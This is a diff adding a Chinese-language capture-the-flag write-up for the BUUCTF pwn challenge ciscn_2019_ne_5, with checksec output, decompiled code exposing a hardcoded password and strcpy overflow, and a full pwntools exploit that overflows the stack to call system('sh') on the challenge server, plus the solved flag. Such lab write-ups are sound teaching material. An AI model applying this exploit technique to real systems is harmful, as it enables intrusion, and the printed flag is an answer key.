@@ -2076,6 +2076,170 @@ io.interactive()
 
 ------
 
+### [ciscn_2019_ne_5](https://buuoj.cn/challenges#ciscn_2019_ne_5)
+
+先`file ./ciscn_2019_ne_5`查看文件类型再`checksec --file=./ciscn_2019_ne_5`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./ciscn_2019_ne_5
+./ciscn_2019_ne_5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6482843cea0a0b348169075298025f13ef6c6ec2, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./ciscn_2019_ne_5
+[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_ne_5'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开`./ciscn_2019_ne_5`后按`F5`反汇编源码并查看主函数，可以看到`admin`的密码是`administrator`。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  int v4; // [esp+0h] [ebp-100h] BYREF
+  char src[4]; // [esp+4h] [ebp-FCh] BYREF
+  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
+  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
+  char v8[96]; // [esp+88h] [ebp-78h] BYREF
+  int *v9; // [esp+F4h] [ebp-Ch]
+
+  v9 = &argc;
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  fflush(stdout);
+  *(_DWORD *)s1 = 48;
+  memset(v8, 0, sizeof(v8));
+  *(_DWORD *)src = 48;
+  memset(v6, 0, sizeof(v6));
+  puts("Welcome to use LFS.");
+  printf("Please input admin password:");
+  __isoc99_scanf("%100s", s1);
+  if ( strcmp(s1, "administrator") )      // admin登录密码是明文存储的
+  {
+    puts("Password Error!");
+    exit(0);
+  }
+  puts("Welcome!");
+  puts("Input your operation:");
+  puts("1.Add a log.");
+  puts("2.Display all logs.");
+  puts("3.Print all logs.");
+  printf("0.Exit\n:");
+  __isoc99_scanf("%d", &v4);
+  switch ( v4 )
+  {
+    case 0:
+      exit(0);
+      return result;
+    case 1:
+      AddLog(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 2:
+      Display(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 3:
+      Print();
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 4:
+      GetFlag(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    default:
+      result = sub_804892B(argc, argv, envp);
+      break;
+  }
+  return result;
+}
+```
+
+双击`AddLog(src);`查看函数详情，有个`scanf`函数。
+
+```c
+int __cdecl AddLog(int a1)
+{
+  printf("Please input new log info:");
+  return __isoc99_scanf("%128s", a1);
+}
+```
+
+双击`Display(src);`查看函数详情，返回值是直接调用了`puts`函数。
+
+```c
+int __cdecl Display(char *s)
+{
+  return puts(s);
+}
+```
+
+双击`Print();`查看函数详情，可以得知程序中存在系统调用函数`system`，通过`elf.symbols['system']`可获得`system`的函数地址。
+
+```c
+int Print()
+{
+  return system("echo Printing......");
+}
+```
+
+双击`GetFlag();`查看函数详情，`dest`直接拷贝`AddLog`中的实参`src`，`dest`需要`0x48`个字节填满`padding`，覆盖到栈帧还需`4`字节。
+
+```c
+int __cdecl GetFlag(char *src)
+{
+  char dest[4]; // [esp+0h] [ebp-48h] BYREF
+  char v3[60]; // [esp+4h] [ebp-44h] BYREF
+
+  *(_DWORD *)dest = 48;
+  memset(v3, 0, sizeof(v3));
+  strcpy(dest, src);
+  return printf("The flag is your log:%s\n", dest);
+}
+```
+
+用`ROPgadget`查询`"/bin/sh"`字符串未果，但是可以找到`"sh"`字符串。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ ROPgadget --binary ./ciscn_2019_ne_5 --string "/bin/sh"
+Strings information
+============================================================
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"         
+Strings information
+============================================================
+0x080482ea : sh
+```
+
+编写`Python`代码进行求解可以得到`flag{e911a4b9-c3d7-4737-93ca-2ff81cfc04f0}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29145)
+elf = ELF('./ciscn_2019_ne_5')
+system_addr = elf.symbols['system']
+sh_addr = 0x80482ea # ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"
+exit_addr = elf.symbols['exit']
+io.sendlineafter(b'Please input admin password:', 'administrator')
+payload = b'a'*(0x48+0x4) + p32(system_addr) + p32(exit_addr) + p32(sh_addr)
+io.sendlineafter(b'Exit\n:', '1')
+io.sendlineafter(b'Please input new log info:', payload)
+io.sendlineafter(b'Exit\n:', '4')
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
